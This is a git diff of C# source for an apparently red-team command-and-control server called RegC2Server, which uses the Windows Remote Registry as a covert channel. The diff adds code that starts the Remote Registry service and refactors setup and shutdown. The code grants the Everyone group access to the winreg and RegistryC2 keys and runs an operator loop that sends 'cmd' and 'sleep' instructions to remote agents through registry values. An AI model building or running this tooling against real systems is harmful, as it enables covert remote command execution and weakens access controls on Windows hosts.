@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Security.AccessControl;
 using System.Security.Principal;
+using System.ServiceProcess;
 using Microsoft.Win32;
 
 
@@ -75,10 +76,40 @@ namespace RegC2Server
                 "exit             Exits the application gracefully");
         }
 
-        static void StartRemoteRegistry()
+        static bool StartRemoteRegistryService()
         {
+            // https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicecontroller.start?view=dotnet-plat-ext-6.0
+            // Check whether the Remote Registry service is started.
 
+            ServiceController sc = new ServiceController();
+            sc.ServiceName = "Remoteregistry";
+            Console.WriteLine("[!] The Remote Registry service status is currently set to {0}",
+                               sc.Status.ToString());
+            if (sc.Status == ServiceControllerStatus.Stopped || sc.Status == ServiceControllerStatus.StopPending || sc.Status == ServiceControllerStatus.Paused)
+            {
+                Console.WriteLine("[!] Remote Registry is not running... Trying to start it");
+
+                try
+                {
+                    // Start the service, and wait until its status is "Running".
+                    sc.Start();
+                    sc.WaitForStatus(ServiceControllerStatus.Running);
+
+                    // Display the current service status.
+                    Console.WriteLine("[+] The Remote Registry service status is now set to {0}.",
+                                       sc.Status.ToString());
+                    return true;
+                }
+                catch (InvalidOperationException)
+                {
+                    return false;
+                }
+
+            }
+            Console.WriteLine("[+] Remoteregistry Seems to be running already...");
+            return true;
         }
+
 
         static void SetupRegistryKeys(string registrykey)
         {
@@ -118,9 +149,7 @@ namespace RegC2Server
         {
 
             RegistryKey myReg = Registry.LocalMachine.OpenSubKey(registrykey, RegistryKeyPermissionCheck.ReadWriteSubTree);
-
             SecurityIdentifier si = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
-
             RegistrySecurity rs = myReg.GetAccessControl();
 
             if (allow)
@@ -163,32 +192,54 @@ namespace RegC2Server
             }
         }
 
+        public static void Shutdown(string registryKey)
+        {
+            Console.WriteLine("[+] Closing down...");
+            ChangeRegistryPermissions(@"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg", false);
+            ChangeRegistryPermissions(@"SOFTWARE\RegistryC2\" + registryKey, false);
+            //Environment.Exit(0);
+        }
+
+        public static void Setup(string registryKey)
+        {
+            Console.WriteLine("[+] Welcome to RegC2");
+            //Make sure the RemoteRegistryService is started...
+            if (!StartRemoteRegistryService())
+            {
+                Console.WriteLine("[-] Could not start the service... Sure your are running as administrator?");
+                Console.WriteLine("[-] Shutting down.. ");
+                Environment.Exit(0);
+            }
+
+            //Setup the Windows Registry Keys to handle communication...
+            Console.WriteLine("[+] Setting up permissions to WinReg...");
+            ChangeRegistryPermissions(@"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg", true);
+
+            Console.WriteLine("[+] Setting up Registry keys...");
+            SetupRegistryKeys(registryKey);
+        }
+
         static void Main(string[] args)
         {
+            //Make sure argument is passed correctly
             if (args.Length != 1)
             {
                 Console.WriteLine("RegC2Server.exe <Unique Registry key name to use>\n" +
                                   "RegC2Server.exe dc01");
                 return;
             }
+            string registryKey = args[0];
 
-            //Catching Ctrl + C events to clean up correctly
+            //Catching Ctrl + C events to clean up correctly...
             Console.CancelKeyPress += delegate
             {
-                Console.WriteLine("[+] Closing down...");
-                ChangeRegistryPermissions(@"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg", false);
-                ChangeRegistryPermissions(@"SOFTWARE\RegistryC2\" + args[0], false);
-                //Environment.Exit(0);
+                Shutdown(registryKey);
             };
 
-            Console.WriteLine("[+] Welcome to RegC2");
+            //Run Setup function
+            Setup(registryKey);
 
-            Console.WriteLine("[+] Setting up permissions to WinReg...");
-            ChangeRegistryPermissions(@"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg", true);
-            
-            Console.WriteLine("[+] Setting up Registry keys...");
-            SetupRegistryKeys(args[0]);
-
+            //C2 loop
             Console.WriteLine("[+] Ready...");
             while (true)
             {
@@ -201,19 +252,16 @@ namespace RegC2Server
 
                 if (cmd.StartsWith("sleep", StringComparison.OrdinalIgnoreCase))
                 {
-                    UpdateSleep(args[0], cmd);
+                    UpdateSleep(registryKey, cmd);
                 }
 
                 if (cmd.StartsWith("cmd", StringComparison.OrdinalIgnoreCase))
                 {
-                    RunCmd(args[0], cmd);
+                    RunCmd(registryKey, cmd);
                 }
 
                 if (cmd.StartsWith("exit", StringComparison.OrdinalIgnoreCase)) {
-                    Console.WriteLine("[+] Closing down...");
-                    ChangeRegistryPermissions(@"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg", false);
-                    ChangeRegistryPermissions(@"SOFTWARE\RegistryC2\"+args[0], false);
-                    Environment.Exit(0);
+                    Shutdown(registryKey);
                 }
             }
 
